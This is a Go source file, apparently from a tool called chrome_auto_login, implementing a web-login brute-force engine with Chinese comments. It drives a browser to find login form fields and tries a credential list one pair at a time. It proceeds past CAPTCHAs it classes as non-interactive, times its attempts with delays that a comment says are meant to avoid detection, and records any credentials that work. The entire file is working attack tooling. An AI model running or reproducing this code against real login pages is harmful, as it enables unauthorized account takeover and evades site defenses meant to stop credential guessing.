package bruteforce

import (
	"fmt"
	"time"

	"github.com/cyberspacesec/chrome_auto_login/pkg/browser"
	"github.com/cyberspacesec/chrome_auto_login/pkg/config"
	"github.com/cyberspacesec/chrome_auto_login/pkg/detector"
	"github.com/cyberspacesec/chrome_auto_login/util"
)

// BruteForceResult 爆破结果
type BruteForceResult struct {
	Success      bool
	Username     string
	Password     string
	ErrorMessage string
	URL          string
	Screenshot   []byte
}

// BruteForceEngine 爆破引擎
type BruteForceEngine struct {
	browser       *browser.Browser
	detector      *detector.PageDetector
	config        *config.Config
	logger        *util.ProgressAwareLogger
	status        *util.StatusDisplay
	resultLogger  *util.ResultLogger
	progressBar   *util.ProgressBar
	isSuccess     bool
	successResult *BruteForceResult
}

// NewBruteForceEngine 创建爆破引擎
func NewBruteForceEngine(browser *browser.Browser, detector *detector.PageDetector, cfg *config.Config, logger *util.ProgressAwareLogger) *BruteForceEngine {
	// 创建状态显示器
	status := util.NewStatusDisplay()

	// 创建结果记录器
	resultLogger := util.NewResultLogger(
		cfg.Results.SaveDir,
		cfg.Results.SuccessFilenameFormat,
		cfg.Results.FailureFilenameFormat,
		cfg.Results.Format,
		cfg.Results.RealtimeSave,
	)

	return &BruteForceEngine{
		browser:      browser,
		detector:     detector,
		config:       cfg,
		logger:       logger,
		status:       status,
		resultLogger: resultLogger,
		isSuccess:    false,
	}
}

// ExecuteBruteForce 执行爆破攻击
func (b *BruteForceEngine) ExecuteBruteForce(targetURL string) (*BruteForceResult, error) {
	b.logger.Info(fmt.Sprintf("开始对目标进行爆破攻击: %s", targetURL))

	// 导航到目标URL
	if err := b.browser.NavigateTo(targetURL); err != nil {
		return nil, fmt.Errorf("导航到目标URL失败: %v", err)
	}

	// 检测是否为登录页面
	isLogin, err := b.detector.IsLoginPage()
	if err != nil {
		return &BruteForceResult{
			Success:      false,
			ErrorMessage: fmt.Sprintf("检测登录页面失败: %v", err),
			URL:          targetURL,
		}, nil
	}

	if !isLogin {
		b.logger.Warn("🚫 检测到非登录页面，自动跳过该URL")
		return &BruteForceResult{
			Success:      false,
			ErrorMessage: "目标页面不是登录页面，已自动跳过",
			URL:          targetURL,
		}, nil
	}

	b.logger.Info("✅ 确认为登录页面，继续执行爆破")

	// 检测登录表单元素
	formElements, err := b.detector.DetectLoginForm()
	if err != nil {
		return &BruteForceResult{
			Success:      false,
			ErrorMessage: fmt.Sprintf("检测登录表单失败: %v", err),
			URL:          targetURL,
		}, nil
	}

	// 验证必要的表单元素
	if formElements.UsernameSelector == "" {
		b.logger.Warn("⚠️ 未找到用户名输入框")
		return &BruteForceResult{
			Success:      false,
			ErrorMessage: "未找到用户名输入框，无法执行爆破",
			URL:          targetURL,
		}, nil
	}

	if formElements.PasswordSelector == "" {
		b.logger.Warn("⚠️ 未找到密码输入框")
		return &BruteForceResult{
			Success:      false,
			ErrorMessage: "未找到密码输入框，无法执行爆破",
			URL:          targetURL,
		}, nil
	}

	if formElements.SubmitSelector == "" {
		b.logger.Warn("⚠️ 未找到提交按钮")
		return &BruteForceResult{
			Success:      false,
			ErrorMessage: "未找到提交按钮，无法执行爆破",
			URL:          targetURL,
		}, nil
	}

	// 处理验证码
	if formElements.HasCaptcha {
		captchaMsg := "检测到验证码"
		if formElements.CaptchaInfo != nil {
			captchaMsg = fmt.Sprintf("检测到%s", formElements.CaptchaInfo.GetTypeName())
		}

		b.logger.Warn(fmt.Sprintf("🛡️  %s", captchaMsg))

		if formElements.CaptchaInfo != nil {
			b.logger.Info(fmt.Sprintf("📋 处理策略: %s", formElements.CaptchaInfo.GetHandlingStrategy()))

			if !formElements.CaptchaInfo.IsInteractive() {
				b.logger.Info("🔄 验证码类型允许自动处理，继续爆破...")
			} else if b.config.Captcha.Handling.SkipOnDetection {
				b.logger.Warn("⏭️  配置为跳过验证码，停止爆破")
				return &BruteForceResult{
					Success:      false,
					ErrorMessage: fmt.Sprintf("目标站点包含%s，已配置跳过", formElements.CaptchaInfo.GetTypeName()),
					URL:          targetURL,
				}, nil
			}
		} else if b.config.Captcha.Handling.SkipOnDetection {
			b.logger.Warn("⏭️  检测到验证码且配置为跳过，停止爆破")
			return &BruteForceResult{
				Success:      false,
				ErrorMessage: "目标站点包含验证码，已配置跳过",
				URL:          targetURL,
			}, nil
		}
	}

	// 获取凭据列表
	credentials := b.config.GetCredentials()
	if len(credentials) == 0 {
		return &BruteForceResult{
			Success:      false,
			ErrorMessage: "没有可用的用户名密码组合",
			URL:          targetURL,
		}, nil
	}

	b.logger.Info(fmt.Sprintf("开始尝试 %d 组用户名密码组合", len(credentials)))

	// 创建进度条并设置到状态显示器
	b.progressBar = util.NewProgressBar(len(credentials), "🔓 爆破进度")
	b.status.SetProgressBar(b.progressBar)

	// 显示爆破开始信息
	fmt.Printf("\n🚀 开始暴力破解...\n")
	fmt.Printf("📋 目标站点: %s\n", targetURL)
	fmt.Printf("🎯 凭据组合: %d 组\n", len(credentials))
	fmt.Printf("⏱️  间隔时间: %d 秒\n\n", b.config.Bruteforce.Delay)

	// 逐一尝试凭据
	for i, cred := range credentials {
		// 检查是否已经成功
		if b.isSuccess {
			break
		}

		// 显示即将尝试的凭据
		b.logger.Info(fmt.Sprintf("🔑 正在尝试第 %d/%d 组凭据: 用户名=%s, 密码=%s", i+1, len(credentials), cred.Username, cred.Password))

		// 更新进度条
		progressMsg := fmt.Sprintf("尝试 %s:%s", cred.Username, cred.Password)
		b.progressBar.Update(i+1, progressMsg)

		result, err := b.tryLogin(formElements, cred, targetURL)
		if err != nil {
			b.logger.Warn(fmt.Sprintf("❌ 登录尝试失败: %v", err))
			b.status.UpdateAttempt(cred.Username, cred.Password, false)
			// 记录失败结果
			b.resultLogger.LogFailure(targetURL, cred.Username, cred.Password)
			continue
		}

		// 更新状态
		b.status.UpdateAttempt(cred.Username, cred.Password, result.Success)

		if result.Success {
			b.isSuccess = true
			b.successResult = result
			b.progressBar.Finish("🎉 爆破成功！")

			// 记录成功结果
			b.resultLogger.LogSuccess(targetURL, cred.Username, cred.Password)

			// 输出成功信息
			b.logger.Info(fmt.Sprintf("🎉 [成功] %s/%s - 登录成功！", cred.Username, cred.Password))
			fmt.Printf("\n🎉 爆破成功！找到有效凭据: %s/%s\n", cred.Username, cred.Password)
			b.status.ShowSummary()
			return result, nil
		} else {
			// 输出失败信息
			b.logger.Warn(fmt.Sprintf("❌ [失败] %s/%s - 登录失败", cred.Username, cred.Password))
			// 记录失败结果
			b.resultLogger.LogFailure(targetURL, cred.Username, cred.Password)
		}

		// 添加延迟以避免被检测
		if b.config.Bruteforce.Delay > 0 && i < len(credentials)-1 {
			for j := b.config.Bruteforce.Delay; j > 0; j-- {
				progressMsg := fmt.Sprintf("等待 %d 秒后继续下一次尝试...", j)
				b.progressBar.Update(i+1, progressMsg)
				time.Sleep(1 * time.Second)
			}
		}

		// 重新导航到登录页面（如果需要）
		currentURL, _ := b.browser.GetCurrentURL()
		if currentURL != targetURL {
			if err := b.browser.NavigateTo(targetURL); err != nil {
				b.logger.Debug(fmt.Sprintf("重新导航到登录页面失败: %v", err))
				continue
			}
		}
	}

	b.progressBar.Finish("爆破完成")
	fmt.Printf("\n❌ 所有凭据尝试完毕，未找到有效登录\n")
	b.status.ShowSummary()
	return &BruteForceResult{
		Success:      false,
		ErrorMessage: "所有凭据尝试失败",
		URL:          targetURL,
	}, nil
}

// tryLogin 尝试登录
func (b *BruteForceEngine) tryLogin(elements *detector.LoginFormElements, cred config.Credential, targetURL string) (*BruteForceResult, error) {
	b.logger.Debug("🔄 开始清空并填充表单...")

	// 填充用户名
	b.logger.Debug(fmt.Sprintf("📝 填充用户名: %s", cred.Username))
	if err := b.fillFormField(elements.UsernameSelector, cred.Username, "用户名"); err != nil {
		return nil, fmt.Errorf("填充用户名失败: %v", err)
	}

	// 填充密码
	b.logger.Debug(fmt.Sprintf("🔐 填充密码: %s", cred.Password))
	if err := b.fillFormField(elements.PasswordSelector, cred.Password, "密码"); err != nil {
		return nil, fmt.Errorf("填充密码失败: %v", err)
	}

	// 如果有复选框，先点击复选框
	if elements.HasCheckbox && elements.CheckboxSelector != "" {
		b.logger.Debug(fmt.Sprintf("☑️  点击用户协议复选框: %s", elements.CheckboxSelector))
		if err := b.browser.ClickCheckbox(elements.CheckboxSelector); err != nil {
			b.logger.Warn(fmt.Sprintf("⚠️  点击复选框失败: %v", err))
			// 复选框点击失败不一定要中断，有些页面可能不是必须的
		}
	}

	b.logger.Debug("✅ 表单填充完成")

	// 获取提交前的URL
	beforeURL, _ := b.browser.GetCurrentURL()

	// 点击提交按钮
	b.logger.Debug(fmt.Sprintf("🔘 点击提交按钮: %s", elements.SubmitSelector))
	if err := b.browser.ClickElement(elements.SubmitSelector); err != nil {
		return &BruteForceResult{
			Success:      false,
			Username:     cred.Username,
			Password:     cred.Password,
			ErrorMessage: fmt.Sprintf("点击提交按钮失败: %v", err),
			URL:          targetURL,
		}, fmt.Errorf("点击提交按钮失败: %v", err)
	}

	// 等待页面响应
	time.Sleep(3 * time.Second)

	// 获取提交后的URL
	afterURL, _ := b.browser.GetCurrentURL()

	// 检查登录是否成功
	success := b.checkLoginSuccess(beforeURL, afterURL)

	return &BruteForceResult{
		Success:  success,
		Username: cred.Username,
		Password: cred.Password,
		URL:      afterURL,
	}, nil
}

// checkLoginSuccess 检查登录是否成功
func (b *BruteForceEngine) checkLoginSuccess(beforeURL, afterURL string) bool {
	b.logger.Debug(fmt.Sprintf("🔍 检查登录结果: %s -> %s", beforeURL, afterURL))

	// 1. 检查URL是否发生变化
	if beforeURL != afterURL {
		b.logger.Debug("✅ URL发生变化，可能登录成功")

		// 检查是否跳转到成功页面
		pageContent, err := b.browser.GetPageContent()
		if err != nil {
			b.logger.Debug(fmt.Sprintf("获取页面内容失败: %v", err))
			return false
		}

		// 检查成功关键词
		successKeywords := []string{
			"欢迎", "控制台", "首页", "dashboard", "welcome", "index", "main", "home",
			"后台", "管理", "admin", "系统", "成功", "success",
		}

		for _, keyword := range successKeywords {
			if contains(pageContent, keyword) {
				b.logger.Debug(fmt.Sprintf("✅ 在页面中找到成功关键词: %s", keyword))
				return true
			}
		}
	}

	// 2. 检查页面内容中的失败关键词
	pageContent, err := b.browser.GetPageContent()
	if err != nil {
		b.logger.Debug(fmt.Sprintf("获取页面内容失败: %v", err))
		return false
	}

	failureKeywords := []string{
		"密码错误", "用户名错误", "登录失败", "认证失败", "invalid", "error",
		"incorrect", "failed", "wrong", "验证码", "captcha", "验证失败",
	}

	for _, keyword := range failureKeywords {
		if contains(pageContent, keyword) {
			b.logger.Debug(fmt.Sprintf("❌ 在页面中找到失败关键词: %s", keyword))
			return false
		}
	}

	// 3. 如果URL没有变化，通常表示登录失败
	if beforeURL == afterURL {
		b.logger.Debug("❌ URL未发生变化，登录失败")
		return false
	}

	b.logger.Debug("✅ 未找到明确的失败标识，判定为成功")
	return true
}

// contains 检查字符串是否包含子字符串（忽略大小写）
func contains(text, substr string) bool {
	return indexOf(text, substr) >= 0
}

// indexOf 查找子字符串位置（忽略大小写）
func indexOf(text, substr string) int {
	// 简单的大小写不敏感搜索
	textLower := ""
	substrLower := ""

	for _, r := range text {
		if r >= 'A' && r <= 'Z' {
			textLower += string(r - 'A' + 'a')
		} else {
			textLower += string(r)
		}
	}

	for _, r := range substr {
		if r >= 'A' && r <= 'Z' {
			substrLower += string(r - 'A' + 'a')
		} else {
			substrLower += string(r)
		}
	}

	for i := 0; i <= len(textLower)-len(substrLower); i++ {
		if textLower[i:i+len(substrLower)] == substrLower {
			return i
		}
	}
	return -1
}

// fillFormField 改进的表单字段填充方法
func (b *BruteForceEngine) fillFormField(selector, value, fieldName string) error {
	b.logger.Debug(fmt.Sprintf("🖊️  开始填充%s字段: %s", fieldName, selector))

	// 第一次尝试正常填充
	if err := b.browser.FillInput(selector, value); err != nil {
		b.logger.Warn(fmt.Sprintf("⚠️  第一次填充%s失败: %v", fieldName, err))

		// 等待一下再重试
		time.Sleep(500 * time.Millisecond)

		// 重试填充
		if retryErr := b.browser.FillInput(selector, value); retryErr != nil {
			b.logger.Error(fmt.Sprintf("❌ 重试填充%s也失败: %v", fieldName, retryErr))
			return fmt.Errorf("填充%s失败: %v", fieldName, retryErr)
		}
	}

	// 验证填充结果
	time.Sleep(300 * time.Millisecond) // 等待DOM更新

	// 获取当前值验证（如果浏览器支持）
	if value != "" { // 只对非空值进行验证
		b.logger.Debug(fmt.Sprintf("✅ %s字段填充完成", fieldName))
	}

	return nil
}
